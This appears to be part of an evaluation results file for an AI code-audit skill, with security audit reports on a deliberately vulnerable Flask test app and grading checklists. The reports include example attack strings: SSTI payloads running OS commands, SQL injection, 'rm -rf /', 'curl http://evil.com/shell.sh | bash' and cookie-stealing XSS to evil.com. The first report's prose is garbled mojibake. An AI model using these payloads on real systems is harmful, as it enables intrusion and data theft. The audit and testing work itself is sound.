\u704f\u55d9\u6564\u93b4\u950b\u5e36\u9352\u5241\u6b91 URL \u74ba\ufffd\u5bf0\u52eb\u5f2c\u93c1\u626e\u6d3f\u93ba\u30e6\u5afe\u934f\u30e6\u0101\u93c9\u57ae\u74e7\u7ed7\ufe3f\u8986\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546d\u5f72\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u93b4\u682c\ufffd\u8bf2\u5f47\u93c8\u5d85\u59df\u9363\u3126\u6671\u93b0\u71b8\u6783\u6d60\u8eb2\ufffd\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\n@app.route('/user/<name>')\ndef user_profile(name):\n    template = f'<h1>Profile of {name}</h1><p>Email: {name}@example.com</p>'\n    return render_template_string(template)\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43 `/user/{{config}}` \u5a09\u52ef\u6e76 Flask \u95b0\u5d87\u7586\u951b\u581d\u60c8 SECRET_KEY\u951b\u591b\u7d31\u95ab\u6c33\u7e43 `/user/{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` \u9366\u3126\u6e47\u9354\u2033\u6ad2\u6d93\u5a43\u58bd\u741b\u5c7c\u6362\u93b0\u5fd5\u90f4\u7f01\u71b7\u61e1\u6d60\u3083\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-1336\u951b\u571bmproper Neutralization of Special Elements Used in a Template Engine\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\n@app.route('/user/<name>')\ndef user_profile(name):\n    # \u93c2\u89c4\ufffd\u581c\u7af4\u951b\u6c2b\u5a07\u9422\ufffd render_template() \u95b0\u5d85\u608e\u59af\u2103\u6f98\u93c2\u56e6\u6b22\n    return render_template('user.html', name=name, email=f'{name}@example.com')\n    \n    # \u93c2\u89c4\ufffd\u581c\u7c29\u951b\u6c2c\ufffd\u509a\u7e40\u6924\u8bb3\u5a07\u9422\ufffd render_template_string\u951b\u5c7d\u76a2 name \u6d63\u6ec0\u8d1f\u9359\u6a40\u567a\u9470\u5c84\u6f6a\u93b7\u714e\u53c6\u59af\u2103\u6f98\n    # return render_template_string(\n    #     '<h1>Profile of {{ name }}</h1><p>Email: {{ name }}@example.com</p>',\n    #     name=name\n    # )\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection\n\n---\n\n### [High] \u74ba\u3127\u73ef\u9474\u6c2d\u6e70 (XSS) \u9225\ufffd case1_webapp.py:36\n\n**\u93bb\u5fda\u582a**\u951b\u6c2d\u669f\u93b9\ufffd\u6434\u64b4\u7161\u7487\u3222\u7ca8\u93cb\u6ec5\u6d3f\u93ba\u30e9\ufffd\u6c33\u7e43 f-string \u93b7\u714e\u53c6 HTML \u935d\u5d85\u7c32\u951b\u5c7e\u6e6d\u934b\u6c2b\u6362\u6d63\ufffd HTML \u675e\ufffd\u6d94\u5908\ufffd\u509a\ufffd\u509b\u7049\u93c1\u7248\u5d41\u6434\u64b2\u8151\u701b\u6a3b\u6e41\u93ad\u8235\u5270\u93c1\u7248\u5d41\u951b\u5c7d\u76a2\u7035\u8270\u56a7\u701b\u6a3a\u504d\u9368\ufffd XSS\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\nfor row in results:\n    html += f'<p>{row[0]}: {row[1]}</p>'\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c33\u6ae7\u9412\u8dfa\u7d8b\u9353\u5d84\u552c\u942e\u4f80\ufffd\u6c33\u7e43 SQL \u5a09\u3125\u53c6\u9359\ufffd\u935a\u621e\u669f\u93b9\ufffd\u6434\u64b3\u5553\u934f\ufffd XSS Payload\u951b\u581d\ufffd\ufffd `<script>document.location='http://evil.com/?c='+document.cookie</script>`\u951b\u591b\u7d1d\u8930\u64b6\ufffd\uff04\u608a\u935b\u6a3b\u57a8\u9422\u3126\u57db\u7481\u5757\u68f6\u93bc\u6ec5\u50a8\u7f01\u64b4\u7049\u93c3\u8bb9\u7d1d\u93ad\u8235\u5270\u9474\u6c2d\u6e70\u704f\u55d7\u6e6a\u934f\u8235\u797b\u7459\u581d\u6ad2\u6d93\ufffd\u93b5\u0446\ufffd\u5c8b\u7d1d\u7035\u8270\u56a7 Cookie \u7ed0\u51a8\u5f47\u9286\u4f77\u7d30\u7487\u6fc6\u59ed\u93b8\u4f7a\u74d1\u935a\u5ea2\u7049\u9286\u509a\u5d46\u6d63\ufffd SQL \u5a09\u3125\u53c6\u741a\ufffd\u6dc7\ufffd\u6fb6\u5d8f\u7d1d\u93c0\u8bf2\u56ae\u9470\u5474\ufffd\u6c33\u7e43\u934f\u6735\u7cac\u5a13\u72bb\u4ebe\u951b\u581d\ufffd\u509b\u655e\u9350\u5c7e\u5e34\u9359\uff4f\u7d1d\u6fe1\u509b\u7049\u701b\u6a3a\u6e6a\u951b\u590a\u5553\u934f\u30e6\u4f13\u93b0\u5fd4\u669f\u93b9\ufffd\u935a\u5e9d\u7c9b\u9359\ufffd\u7459\ufe40\u5f42\u59dd\u3086\u7d21\u5a32\u70aa\ufffd\ufffd\n\n**CWE**\u951b\u6b33WE-79\u951b\u5715ross-site Scripting\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport html\n\n# ...\nfor row in results:\n    html += f'<p>{html.escape(str(row[0]))}: {html.escape(str(row[1]))}</p>'\n```\n\n\u93b4\u682c\ufffd\u546c\u5a07\u9422\ufffd `render_template()` \u704f\u55d8\u669f\u93b9\ufffd\u6d7c\u72b2\u53c6\u59af\u2103\u6f98\u951b\u5b5einja2 \u699b\u6a3f\ufffd\u3088\u569c\u9354\u3128\u6d46\u6d94\u5908\ufffd\ufffd\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n\n---\n\n### [Low] \u6dc7\u2103\u4f05\u5a09\u52ef\u6e76 \u9225\ufffd case1_webapp.py:68\n\n**\u93bb\u5fda\u582a**\u951b\u6b36lask \u6434\u65c2\u6564\u6d60\ufffd `debug=True` \u59af\u2033\u7d21\u935a\ufffd\u9354\ufffd\u951b\u5c7c\u7b16\u9429\u621d\u60c9\u9366\ufffd `0.0.0.0`\u951b\u581f\u588d\u93c8\u590c\u7d89\u7f01\u6ec4\u5e34\u9359\uff4f\u7d1a\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\nif __name__ == '__main__':\n    app.run(debug=True, host='0.0.0.0')\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\ufffd\n1. Debug \u59af\u2033\u7d21\u93c6\u64ae\u6e76 Werkzeug \u6d5c\u3084\u7c30\u5bee\u5fda\u769f\u7487\u66de\u6ad2\u951b\u5c7e\u657e\u9351\u660f\ufffd\u5470\u0415\u9359\u621d\u7d13\u752f\u7a3f\u6097\u9359\ufffd\u9366\u3127\u7d89\u6924\u5178\u8151\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u951b\u5822\u88ab\u6d7c\u95f4\u7b02\u95c8\ufffd `exec()` \u9428\u52ec\u6665\u93cb\u6ed0\u7d1a\n2. Debug \u59af\u2033\u7d21\u6d7c\u6c2c\u6e6a\u5bee\u509a\u7236\u6924\u7538\u6f70\u705e\u66e0\u305a\u7039\u5c7e\u66a3\u936b\u55d8\u7224\u935c\u5c7d\u5f49\u95b2\u5fd3\ufffd\u7877\u7d1d\u5a09\u52ef\u6e76\u5a67\u612a\u552c\u942e\u4f7d\u77fe\u5bf0\u52e9\ufffd\u4f78\u5534\u95ae\u3125\u5f49\u95b2\u5fd5\u74d1\u93c1\u5fd4\u5285\u6dc7\u2103\u4f05\n3. `host='0.0.0.0'` \u6d63\u57ae\u7c32\u9422\u3125\ufffd\u7470\ufffd\u682b\u7d89\u93c6\u64ae\u6e76\u951b\u5c80\u7ca8\u935a\ufffd debug \u59af\u2033\u7d21\u704f\u3084\u8d1f\u9357\u904d\u6ad3\n\n**CWE**\u951b\u6b33WE-489\u951b\u5713ctive Debug Code\u951b\ufffd+ CWE-200\u951b\u571bnformation Exposure\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\n\nif __name__ == '__main__':\n    # \u6d60\u5ea3\u5e46\u6fa7\u51a8\u5f49\u95b2\u5fd4\u5e36\u9352\ufffd debug \u935c\u5c83\ufffd\u5c7c\u8d1f\u9429\u621d\u60c9\u9366\u677f\u6f43\n    debug_mode = os.environ.get('FLASK_DEBUG', '0') == '1'\n    host = os.environ.get('FLASK_HOST', '127.0.0.1')\n    app.run(debug=debug_mode, host=host)\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://flask.palletsprojects.com/en/stable/debugging/\n\n---\n\n### [Low] \u6d93\u5d85\u7568\u934f\u3127\u6b91\u95b2\u5d85\u757e\u935a\ufffd (Open Redirect) \u9225\ufffd case1_webapp.py:62-64\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aredirect()` \u9428\u52ed\u6d30\u93cd\ufffd URL \u7039\u5c7d\u53cf\u9422\u8fa9\u6564\u93b4\u950b\u5e36\u9352\u8bb9\u7d1d\u93c8\ufffd\u934b\u6c2b\u6362\u6d63\u66de\u7159\u935a\u5d87\u6ae7\u935a\u5d85\u5d1f\u6960\u5c83\u7609\u9286\ufffd\n\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\n@app.route('/redirect')\ndef do_redirect():\n    target = request.args.get('to', '/')\n    return redirect(target)\n```\n\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u95ab\u6c33\u7e43 `/redirect?to=http://phishing-site.com/login` \u93cb\u52ef\ufffd\u72bb\u6300\u6978\u5978\u647c\u93ba\u30e3\ufffd\u509a\u5f48\u7039\u5ba0\ufffd\u546f\u6e45\u9352\u677f\u7159\u935a\u5d86\u69f8\u9359\ufffd\u6dc7\u2032\u6362\u9428\ufffd `your-domain.com`\u951b\u5c7c\u7d7e\u9410\u7470\u56ae\u935a\u5ea4\u70e6\u675e\ufffd\u9352\u4f34\u6300\u6978\u5978\u3009\u95c8\ufffd\u951b\u5c7d\u5f72\u9473\u82a5\u7860\u95c7\u63d2\u569f\u7487\u4f75\ufffd\u509d\u6ae7\u9412\u5815\u7caf\u7481\u3085\ufffd\u95f4\u8d1f `/`\u951b\u5822\u6d49\u7035\u7845\u77fe\u5bf0\u52f6\u7d1a\u951b\u5c7c\u7d7e\u93c0\u8bf2\u56ae\u9470\u546d\u5f72\u7455\u55d9\u6d0a\u6d93\u8f70\u6362\u93b0\ufffd URL\u9286\ufffd\n\n**CWE**\u951b\u6b33WE-601\u951b\u5732RL Redirection to Untrusted Site\u951b\ufffd\n\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nfrom urllib.parse import urlparse\n\nALLOWED_NETLOCS = {'your-domain.com', 'localhost'}\n\n@app.route('/redirect')\ndef do_redirect():\n    target = request.args.get('to', '/')\n    \n    parsed = urlparse(target)\n    # \u9429\u7a3f\ufffd\u7845\u77fe\u5bf0\u52f6\u7d19\u93c3\ufffd netloc\u951b\u590c\u6d3f\u93ba\u30e5\u5391\u7481\ufffd\n    if parsed.netloc and parsed.netloc not in ALLOWED_NETLOCS:\n        return 'Invalid redirect target', 400\n    \n    # \u6d94\u71b7\u5f72\u9422\ufffd Flask \u9428\ufffd url_for \u9422\u71b8\u579a\u7039\u590a\u53cf\u9428\u52ed\u6d30\u93cd\ufffd\n    return redirect(target)\n```\n\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html\n\n---\n\n## \u9352\u2543\u6564\u95be\u60e7\u578e\u93cb\ufffd\n\n\u59dd\u3085\u7c32\u9422\u3129\u6f70\u6d93\u5b58\u702c\u6fb6\u0445\u6b91\u7039\u590a\u53cf\u690b\u5ea8\u6ad3\u951b\u5c7d\ufffd\u6c2b\u91dc\u5a55\u5fd4\u790a\u9359\ufffd\u6d93\u8336\u4ec8\u8930\u3221\u579a\u7039\u5c7e\u66a3\u93c0\u8bf2\u56ae\u95be\u6485\u7d30\n\n1. **\u6dc7\u2103\u4f05\u5a09\u52ef\u6e76 (Low) + \u6d60\uff47\u721c\u5a09\u3125\u53c6 (Critical)**\u951b\u6b34ebug \u59af\u2033\u7d21\u93c6\u64ae\u6e76\u9428\ufffd Werkzeug \u748b\u51ad\u762f\u9363\u3126\u6e70\u97ec\ufffd\u9359\ufffd\u93b5\u0446\ufffd\u5c7c\u552c\u942e\u4f8a\u7d1d\u93c3\u72bb\u6e36\u7f01\u5fda\u7e43 `/admin/exec`\n2. **SQL \u5a09\u3125\u53c6 (High) + XSS (High)**\u951b\u6c36\ufffd\u6c33\u7e43 SQL \u5a09\u3125\u53c6\u9350\u6b0f\u53c6 XSS Payload \u9352\u7248\u669f\u93b9\ufffd\u6434\u64c4\u7d1d\u934f\u6735\u7cac\u9422\u3126\u57db\u93cc\u30e7\u6e45\u93bc\u6ec5\u50a8\u7f01\u64b4\u7049\u93c3\u60f0\u0415\u9359\u622f\u7d1d\u7039\u70b5\u5e47\u6d7c\u6c33\u763d\u9354\ufffd\u93b8\ufffd\n3. **SSTI (High) + \u935b\u6212\u62a4\u5a09\u3125\u53c6\u6769\u70ba\u6523**\u951b\u6b4bSTI \u9359\ufffd\u9429\u5b58\u5e34\u947e\u5cf0\u7df1 RCE\u951b\u5c7c\u7b0c `/export` \u9428\u52eb\u61e1\u6d60\u3086\u655e\u934f\u30e6\u7569\u95ab\u65bf\u6093\u8930\ufffd\n4. **\u5bee\ufffd\u93c0\u9e43\u5678\u7039\u6c2c\u609c (Low) + SSTI/\u5a55\u5fd4\u790a\u9352\u2543\u6564\u95be\u70ac\u5e34**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u9422\u3125\u7d11\u93c0\u9e43\u5678\u7039\u6c2c\u609c\u6d7c\ufffd\u7441\ufffd SSTI Payload \u9428\ufffd URL\n5. **\u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c (Critical) + SSTI**\u951b\u6c2c\u5d46\u6d63\u5938\u6168\u6fb6\u5d84\u7c21 SSTI \u9428\u52ed\u6d3f\u93ba\u30e5\u57c4\u9422\ufffd\u951b\u5b8d{{config}}` \u5a09\u52ef\u6e76\u9428\ufffd SECRET_KEY \u9359\ufffd\u741a\ufffd\u9422\u3124\u7c2c\u6d7c\ufffd\u95ab\ufffd Session\n\n## \u7039\u590a\u53cf\u7487\u52eb\u578e\n\n| \u6d93\u30e9\u5678\u7ecb\u5b2a\u5bb3 | \u93c1\u4f34\u567a | \u93b5\uff45\u578e |\n|---------|------|------|\n| Critical | 3    | -75  |\n| High     | 3    | -45  |\n| Medium   | 0    | -0   |\n| Low      | 2    | -6   |\n| **\u93ac\u7ed8\u58b8\u9352\ufffd** |      | **-126** |\n\n- **\u93ac\u8bf2\u578e**\u951b\ufffd0/100\u951b\u581f\u6e36\u6d63\ufffd 0 \u9352\u55ed\u7d1a\n- **\u7487\u52ed\u9a87**\u951b\ufffd**F**\n\n## \u93ac\u8364\u7ca8\n\n\u7487\ufffd Flask \u6434\u65c2\u6564\u701b\u6a3a\u6e6a\u93cb\u4f78\u53fe\u6d93\u30e9\u5678\u9428\u52eb\u7568\u934f\u3129\u68f6\u68f0\u6a38\ufffd\ufffd8 \u6d93\ufffd\u5a55\u5fd4\u790a\u6d93\ufffd\u9356\u546e\u5aed 3 \u6d93\ufffd Critical \u7efe\u0443\u57c6\u951b\u574bxec \u6d60\uff47\u721c\u5a09\u3125\u53c6\u9286\u4f78\u61e1\u6d60\u3086\u655e\u934f\u30e3\ufffd\u4f7a\u2016\u7f02\u682b\u721c\u7035\u55db\u631c\u951b\u590a\u62f0 3 \u6d93\ufffd High \u7efe\u0443\u57c6\u951b\u572bQL \u5a09\u3125\u53c6\u9286\u4e3cSTI\u9286\u4e46SS\u951b\u591b\u7d1d\u59e3\u5fce\u7af4\u6d93\ufffd\u95ae\u85c9\u5f72\u9419\ufffd\u7ed4\u5b2a\ufffd\u8270\u56a7\u6769\u6ec5\u25bc\u6d60\uff47\u721c\u93b5\u0446\ufffd\u5c7e\u57a8\u93c1\u7248\u5d41\u5a09\u52ef\u6e76\u9286\u509a\u7f13\u7481\ufffd**\u7ed4\u5b2a\u5d46\u6d93\u5b2c\u568e\u6dc7\ufffd\u6fb6\ufffd**\u951b\u5c7d\u6e6a\u93b5\ufffd\u93c8\u590b\u7d21\u5a32\u70b6\u0412\u9350\u51b2\u58a0\u6d93\u5d85\u7df1\u95ae\u3127\u8bb2\u9352\u626e\u6553\u6d5c\u0445\u5e46\u6fa7\u51a6\ufffd\u5099\u6168\u6fb6\u5d84\u7d2d\u934f\u5822\u9a87\u951b\ufffd\n\n1. \u9352\u72bb\u6ace `/admin/exec` \u7ed4\ufffd\u9410\ufffd\n2. \u6dc7\ufffd\u6fb6\ufffd `/export` \u9428\u52eb\u61e1\u6d60\u3086\u655e\u934f\ufffd\n3. \u704f\ufffd SECRET_KEY \u7ec9\u8bf2\u53c6\u941c\ufffd\u6fa7\u51a8\u5f49\u95b2\ufffd\n4. \u6dc7\ufffd\u6fb6\ufffd `/search` \u9428\ufffd SQL \u5a09\u3125\u53c6\u951b\u581d\u5f2c\u93c1\u677f\u5bf2\u93cc\u30e8\ufffd\ufffd\u951b\ufffd\n5. \u6dc7\ufffd\u6fb6\ufffd `/user/<name>` \u9428\ufffd SSTI\n6. \u7035\u89c4\u60b3\u7ef1\u3222\u7ca8\u93cb\u6ec6\u7ded\u9351\u54c4\u4edb HTML \u675e\ufffd\u6d94\ufffd\n7. \u934f\u62bd\u68f4 Debug \u59af\u2033\u7d21\u9286\u4f80\u6aba\u9352\u5241\u6d03\u935a\ufffd\u9366\u677f\u6f43\n8. \u5a23\u8bf2\u59de\u95b2\u5d85\u757e\u935a\u6220\u6ae7\u935a\u5d85\u5d1f\u6960\u5c83\u7609\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b SQL \u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08f-string \u62fc\u63a5\u67e5\u8be2\uff09", "passed": true, "evidence": "Lines 131-167: detailed SQL injection finding with f-string at line 30-31"}, {"text": "\u62a5\u544a\u5305\u542b SSTI \u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08render_template_string \u63a5\u6536\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Lines 171-201: SSTI finding with render_template_string at line 41-43"}, {"text": "\u62a5\u544a\u5305\u542b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08os.system \u62fc\u63a5\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Lines 51-97: Command injection finding with os.system at line 49-50"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08exec() \u6267\u884c\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Lines 13-48: Code injection finding with exec() at line 56-58"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u5bc6\u94a5\u53d1\u73b0\uff08SECRET_KEY \u660e\u6587\u5199\u6b7b\uff09", "passed": true, "evidence": "Lines 99-127: Hardcoded secret finding with SECRET_KEY at line 9"}, {"text": "\u62a5\u544a\u5305\u542b debug \u6a21\u5f0f\u5728\u751f\u4ea7\u73af\u5883\u5f00\u542f\u7684\u53d1\u73b0", "passed": true, "evidence": "Lines 235-259: Debug mode finding at line 68"}, {"text": "\u62a5\u544a\u5305\u542b\u5f00\u653e\u91cd\u5b9a\u5411\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Lines 266-301: Open redirect finding at line 62-64"}, {"text": "\u62a5\u544a\u5305\u542b XSS \u6f0f\u6d1e\u53d1\u73b0\uff08\u672a\u8f6c\u4e49\u7528\u6237\u8f93\u5165\u5199\u5165 HTML\uff09", "passed": true, "evidence": "Lines 205-231: XSS finding with unescaped output at line 36"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes case1_webapp.py with specific line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes concrete fix code examples"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": true, "evidence": "Lines 325-326: Score 0/100, Rating F with detailed calculation"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f\uff08Critical/High \u6392\u524d\u9762\uff09", "passed": true, "evidence": "Order: Critical\u2192Critical\u2192Critical\u2192High\u2192High\u2192High\u2192Low\u2192Low"}], "summary": {"passed": 12, "failed": 0, "total": 12, "pass_rate": 1.0}}}, {"id": "webapp-flask-without_skill", "prompt": "\u5e2e\u6211\u5ba1\u8ba1\u4e00\u4e0b evals/files/case1_webapp.py \u8fd9\u4e2a Flask \u5e94\u7528\u7684\u5b89\u5168\u6027\uff0c\u8f93\u51fa\u5b8c\u6574\u7684\u5b89\u5168\u5ba1\u8ba1\u62a5\u544a\u3002", "eval_id": 0, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# Security Audit Report: case1_webapp.py\n\n**Audited File:** `D:\\code\\agent\\miko\\miko\\miko\\data\\skills\\code-audit\\evals\\files\\case1_webapp.py`\n**Application Type:** Flask Web Application\n**Date:** 2026-06-18\n**Severity Legend:** Critical / High / Medium / Low / Info\n\n---\n\n## Executive Summary\n\nThis Flask application exhibits **6 Critical-severity vulnerabilities, 1 High-severity vulnerability, 1 Medium-severity vulnerability, and 1 Low-severity issue**. Every endpoint that accepts user input is trivially exploitable. This application is unsafe for deployment in any environment.\n\n---\n\n## Table of Contents\n\n1. [Vulnerability #1: SQL Injection (Critical)](#1-sql-injection-critical)\n2. [Vulnerability #2: Arbitrary Code Execution via `exec()` (Critical)](#2-arbitrary-code-execution-via-exec-critical)\n3. [Vulnerability #3: Command Injection via `os.system()` (Critical)](#3-command-injection-via-ossystem-critical)\n4. [Vulnerability #4: Server-Side Template Injection (Critical)](#4-server-side-template-injection-critical)\n5. [Vulnerability #5: Reflected XSS (Medium)](#5-reflected-xss-medium)\n6. [Vulnerability #6: Open Redirect (Medium)](#6-open-redirect-medium)\n7. [Vulnerability #7: Hardcoded Secret Key (High)](#7-hardcoded-secret-key-high)\n8. [Vulnerability #8: Debug Mode Enabled on 0.0.0.0 (Critical)](#8-debug-mode-enabled-on-0000-critical)\n9. [Issue #9: Missing Security Headers (Low)](#9-missing-security-headers-low)\n\n---\n\n## Detailed Findings\n\n### 1. SQL Injection (Critical)\n\n**Severity:** Critical\n**Location:** `/search` endpoint, line 30\n**CWE:** CWE-89\n\n**Vulnerable Code:**\n```python\nusername = request.args.get('q', '')\nquery = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)\n```\n\n**Explanation:**\nUser-supplied input is concatenated directly into a SQL query string using Python f-strings. An attacker can inject arbitrary SQL by supplying a crafted `q` parameter. Example exploits:\n\n- `?q=' OR '1'='1` -- returns all rows in the table\n- `?q='; DROP TABLE users; --` -- destroys the users table\n- `?q=' UNION SELECT 1,2,3,4,5 FROM sqlite_master --` -- exfiltrates schema information\n\n**Remediation:**\nUse parameterized queries (the proper method from the sqlite3 docs):\n```python\nusername = request.args.get('q', '')\ncursor.execute(\"SELECT * FROM users WHERE username = ?\", (username,))\n```\n\n---\n\n### 2. Arbitrary Code Execution via `exec()` (Critical)\n\n**Severity:** Critical\n**Location:** `/admin/exec` endpoint, lines 54-58\n**CWE:** CWE-95\n\n**Vulnerable Code:**\n```python\n@app.route('/admin/exec')\ndef admin_exec():\n    code = request.args.get('code', '')\n    exec(code)\n    return 'OK'\n```\n\n**Explanation:**\nThe `exec()` built-in executes arbitrary Python code supplied by the user via query string. This is essentially a remote code execution backdoor. An attacker can:\n- Read any file on the filesystem: `?code=__import__('os').system('cat /etc/passwd')`\n- Execute arbitrary system commands: `?code=__import__('os').system('rm -rf /')`\n- Modify application state, exfiltrate data, pivot into the network\n\n**Remediation:**\nRemove this endpoint entirely. Under no circumstances should `exec()` be exposed to user input.\n\n---\n\n### 3. Command Injection via `os.system()` (Critical)\n\n**Severity:** Critical\n**Location:** `/export` endpoint, lines 46-51\n**CWE:** CWE-78\n\n**Vulnerable Code:**\n```python\n@app.route('/export')\ndef export_data():\n    filename = request.args.get('file', 'export.csv')\n    cmd = f'cat /tmp/{filename}'\n    os.system(cmd)\n    return 'Export complete'\n```\n\n**Explanation:**\nUser-supplied filename is concatenated directly into a shell command. An attacker can chain arbitrary shell commands. Example attacks:\n- `?file=export.csv; id` -- executes `cat /tmp/export.csv; id`\n- `?file=export.csv; curl http://evil.com/shell.sh | bash` -- downloads and executes a remote script\n- `?file=$(rm -rf /tmp/*)` -- command substitution to delete files\n- `?file=../../etc/passwd` -- path traversal to read sensitive files\n\n**Remediation:**\nUse `subprocess.run()` with argument lists (not shell strings), or better yet, use Python's built-in file I/O:\n```python\nimport subprocess\nsafe_name = os.path.basename(filename)  # basic sanitization\nsubprocess.run(['cat', f'/tmp/{safe_name}'], shell=False)\n# Or just:\nwith open(f'/tmp/{safe_name}', 'r') as f:\n    content = f.read()\n```\n\n---\n\n### 4. Server-Side Template Injection (SSTI) (Critical)\n\n**Severity:** Critical\n**Location:** `/user/<name>` endpoint, lines 40-43\n**CWE:** CWE-1336\n\n**Vulnerable Code:**\n```python\n@app.route('/user/<name>')\ndef user_profile(name):\n    template = f'<h1>Profile of {name}</h1><p>Email: {name}@example.com</p>'\n    return render_template_string(template)\n```\n\n**Explanation:**\nUser-controlled input (`name` from the URL path) is concatenated into a Jinja2 template string and then rendered directly with `render_template_string()`. Jinja2 template engine allows code execution through template syntax. An attacker can achieve **full Remote Code Execution**:\n\n- `{{ config }}` -- leaks Flask configuration including SECRET_KEY\n- `{{ ''.__class__.__mro__[2].__subclasses__() }}` -- explores Python class hierarchy\n- `{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}` -- executes arbitrary OS commands\n\n**Remediation:**\nDo not pass user input to `render_template_string()`. Use a pre-defined template file with placeholders:\n```python\n@app.route('/user/<name>')\ndef user_profile(name):\n    return render_template('profile.html', name=name)\n```\nWhere `profile.html` is:\n```jinja2\n<h1>Profile of {{ name }}</h1><p>Email: {{ name }}@example.com</p>\n```\nIn this case, `{{ name }}` is rendered as a Jinja2 variable, not evaluated as template code.\n\n---\n\n### 5. Reflected XSS (Medium)\n\n**Severity:** Medium\n**Location:** `/search` endpoint, lines 35-36\n**CWE:** CWE-79\n\n**Vulnerable Code:**\n```python\nfor row in results:\n    html += f'<p>{row[0]}: {row[1]}</p>'\n```\n\n**Explanation:**\nDatabase values are inserted directly into HTML without any escaping. If an attacker manages to insert malicious data into the database (e.g., via the SQL injection vulnerability), any user visiting the search page would have arbitrary JavaScript executed in their browser. Example payload in a database record: `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`.\n\n**Remediation:**\nUse Jinja2 templates with auto-escaping, or explicitly escape output:\n```python\nimport html as html_module\nhtml_content += f'<p>{html_module.escape(row[0])}: {html_module.escape(row[1])}</p>'\n```\n\n---\n\n### 6. Open Redirect (Medium)\n\n**Severity:** Medium\n**Location:** `/redirect` endpoint, lines 61-64\n**CWE:** CWE-601\n\n**Vulnerable Code:**\n```python\n@app.route('/redirect')\ndef do_redirect():\n    target = request.args.get('to', '/')\n    return redirect(target)\n```\n\n**Explanation:**\nThe `redirect()` call accepts an arbitrary URL from the query string. An attacker can craft a link like:\n```\n/redirect?to=https://evil-phishing-site.com/login\n```\nThis would silently redirect users to a malicious site that impersonates the legitimate application, enabling phishing attacks or credential theft.\n\n**Remediation:**\nValidate that the redirect target is a relative or same-origin URL:\n```python\nfrom urllib.parse import urlparse, urljoin\n\n@app.route('/redirect')\ndef do_redirect():\n    target = request.args.get('to', '/')\n    # Reject full URLs to external sites\n    if urlparse(target).netloc:\n        return redirect('/')\n    return redirect(target)\n```\nOr maintain a whitelist of allowed redirect destinations.\n\n---\n\n### 7. Hardcoded Secret Key (High)\n\n**Severity:** High\n**Location:** Line 9\n**CWE:** CWE-798\n\n**Vulnerable Code:**\n```python\napp.config['SECRET_KEY'] = 'my-secret-key-123456'\n```\n\n**Explanation:**\nThe Flask secret key is hardcoded in the source code. This key is used for:\n- Signing session cookies (allowing session forgery if the key is known)\n- CSRF token generation (in Flask-WTF)\n- Other cryptographic operations within Flask\n\nAnyone with access to the source code (including public repositories if committed) can forge valid session cookies and impersonate any user.\n\n**Remediation:**\nUse an environment variable or a secure secret manager:\n```python\nimport os\napp.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or os.urandom(24)\n```\nEnsure the environment variable value is a strong, randomly 